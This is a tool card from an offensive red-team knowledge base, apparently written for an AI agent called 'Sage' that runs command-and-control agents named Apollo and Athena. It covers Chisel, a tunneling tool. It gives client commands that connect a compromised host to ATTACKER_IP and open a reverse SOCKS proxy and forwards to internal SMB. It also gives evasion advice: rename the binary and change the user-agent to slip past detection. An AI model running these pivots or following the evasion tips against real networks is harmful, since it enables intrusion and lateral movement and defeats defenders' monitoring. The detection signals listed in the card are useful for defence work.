---
name: Chisel
category: command-and-control
subcategories: [tunneling, pivoting, socks5, port-forward]
tradecraft_tags: [tunneling, pivoting, socks5, http-tunnel, golang, port-forward]
mitre_attack:
  - id: T1572
    name: Protocol Tunneling
source:
  url: https://github.com/jpillora/chisel
  license: MIT
  maintained: true
binary_type: native-exe
binary_filename: chisel.exe
supported_os: [windows, linux, macos]
architecture: [x64, x86]
privilege_required: user
network_required: true
detection_signal: |
  HTTP/HTTPS traffic to an unusual endpoint (non-standard port, unusual user-agent pattern).
  Long-lived HTTP connections with encrypted payload are anomalous. Network monitoring for
  CONNECT tunnels or HTTP streaming connections. Chisel's default user-agent is detectable.
usage_examples:
  - description: "Server-side (attacker): start chisel server listening for clients"
    args: "./chisel server -p 8080 --reverse"
  - description: "Client-side (target): connect to server and expose SOCKS proxy"
    args: "chisel.exe client ATTACKER_IP:8080 R:socks"
  - description: Port forwarding — expose a specific internal port
    args: "chisel.exe client ATTACKER_IP:8080 R:9090:INTERNAL_HOST:445"
  - description: Reverse tunnel — expose target service on attacker machine
    args: "chisel.exe client ATTACKER_IP:8080 R:8445:127.0.0.1:445"
opsec_notes: |
  Chisel creates HTTP/HTTPS tunnels — traffic appears as web traffic, making it harder
  to detect on networks without DPI. Native EXE — Apollo cannot run via inline_assembly.
  Change the default user-agent string before deployment. For Apollo-based tunneling,
  Athena's built-in SOCKS command is preferred (no binary upload needed). Chisel binary
  should be renamed before deployment.
gotchas: |
  Native EXE — not Apollo-compatible via inline_assembly. On the compromised Windows host,
  chisel must be uploaded to disk and executed as a process. Athena's built-in SOCKS5 proxy
  (`socks start <port>`) provides equivalent functionality without a binary upload. For
  Apollo: there is no built-in SOCKS command — use a separate tunneling binary or switch
  to Athena.
related_ttps: [ligolo-ng, responder, crackmapexec]
alternatives: [ligolo-ng, athena-socks-builtin, frp, ncat-proxy]
common_args:
  server:
    description: Server mode (attacker machine)
    typical_values: [flag-only]
  client:
    description: Client mode (target machine)
    typical_values: [flag-only]
  -p:
    description: Server listen port
    typical_values: [8080, 443, 80]
  ATTACKER:PORT:
    description: Server address for client mode
    typical_values: ["ATTACKER_IP:8080"]
  R:socks:
    description: Enable reverse SOCKS5 proxy on server
    typical_values: ["R:socks"]
  R:PORT:HOST:PORT:
    description: Reverse port forward — expose host:port on server at port
    typical_values: ["R:9090:192.168.1.100:445"]
last_updated: 2026-05-29
---

# Chisel

A fast TCP/UDP tunneling tool written in Go. Chisel creates an encrypted HTTP/HTTPS
tunnel between a compromised host and the attacker's machine, enabling SOCKS5 proxy
access to internal networks or specific port forwarding. Useful for pivoting into
network segments not directly accessible from the attacker.

## Typical use cases
- Create a SOCKS5 proxy to reach internal network segments from attacker infrastructure
- Port forward specific services (SMB, LDAP, RDP) through the compromised host
- HTTP-based tunnel that evades network filtering blocking raw TCP

## How Sage uses this
Chisel is a network pivoting tool for infrastructure. For Apollo-based tunneling,
Athena's built-in `socks` command is preferred (no binary upload). Chisel is used
when Apollo is the agent and a SOCKS proxy is needed on the target.

## Apollo-specific note
Native EXE — not Apollo inline_assembly compatible. Must be uploaded to disk and
executed as a process. Consider Athena (built-in SOCKS5) if tunneling is a primary
requirement.
